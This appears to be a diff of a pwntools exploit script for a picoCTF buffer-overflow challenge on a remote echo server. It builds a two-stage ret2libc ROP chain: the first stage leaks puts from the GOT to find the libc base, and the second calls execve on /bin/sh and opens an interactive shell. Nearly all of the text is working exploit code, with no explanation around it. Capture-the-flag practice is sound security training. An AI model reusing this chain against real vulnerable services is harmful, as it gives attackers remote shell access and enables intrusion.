@@ -2,12 +2,13 @@
 
 from pwn import *
 
-exe = ELF("./vuln_patched_patched")
+exe = ELF("./vuln_patched")
 libc = ELF("./libc.so.6")
 ld = ELF("./ld-2.27.so")
 
 context.binary = exe
-offset = 136
+context.log_level = 'debug'
+
 
 def conn():
     if args.LOCAL:
@@ -15,59 +16,44 @@ def conn():
         if args.DEBUG:
             gdb.attach(r)
     else:
-        r = remote("mercury.picoctf.net", 24159)
+        r = remote("mercury.picoctf.net", 62289)
 
     return r
 
 
 def main():
     r = conn()
-    rop = ROP(exe)
 
-    log.info("puts() address in GOT: {}".format(hex(exe.got['puts'])))
-
-    rop.call('puts', [exe.got['puts']])
-    rop.do_stuff()
-
-    log.info("First ROP chain:\n{}".format(rop.dump()))
-
-    payload = fit({
-        offset: bytes(rop)
-    })
-
-    log.info("Sending payload\n{}".format(hexdump(payload)))
-
-    r.sendlineafter("WeLcOmE To mY EcHo sErVeR!\n", payload)
-    r.recvline()
-
-    puts_addr = int.from_bytes(r.recvline(keepends=False), byteorder='little')
-    log.info("puts() runtime address: {}".format(hex(puts_addr)))
-
-    libc_base = puts_addr - libc.symbols['puts']
-    assert(libc_base & 0xFFF == 0)
-    log.info("LibC runtime base address: {}".format(rop.dump()))
-
-    libc.address = libc_base
+    offset = 136
 
     rop = ROP(exe)
-    rop.call('puts', [exe.got['puts']])
-    rop.call(libc.symbols['system'], [next(libc.search(b"/bin/sh"))])
-    log.info("Second ROP chain:\n{}".format(rop.dump()))
+    rop.raw(b'A' * offset)
+    rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
+    rop.raw(exe.got.puts)
+    rop.raw(exe.plt.puts)
+    rop.raw(exe.sym.main)
 
-    payload = fit({
-        offset: bytes(rop)
-    })
+    r.recvuntil(b'sErVeR!\n')
+    r.sendline(rop.chain())
 
-    log.info("Sending payload:\n{}".format(hexdump(payload)))
-
-    r.sendline(payload)
-    r.recvline()
     r.recvline()
 
-    # good luck pwning :)
+    libc.address = u64(r.recv(6).strip(b'\n').ljust(8, b'\x00')) - libc.sym.puts
+    log.info("libc, %#x", libc.address)
+
+    rop2 = ROP(libc)
+    rop2.raw(b'A' * offset)
+    rop2.raw(rop2.find_gadget(['pop rdi', 'ret'])[0])
+    rop2.raw(next(libc.search(b'/bin/sh\x00')))
+    rop2.raw(rop2.find_gadget(['pop rsi', 'ret'])[0])
+    rop2.raw(0)
+    rop2.raw(rop2.find_gadget(['pop rdx', 'ret'])[0])
+    rop2.raw(0)
+    rop2.raw(libc.sym.execve)
+
+    r.sendline(rop2.chain())
 
     r.interactive()
-
 
 if __name__ == "__main__":
     main()
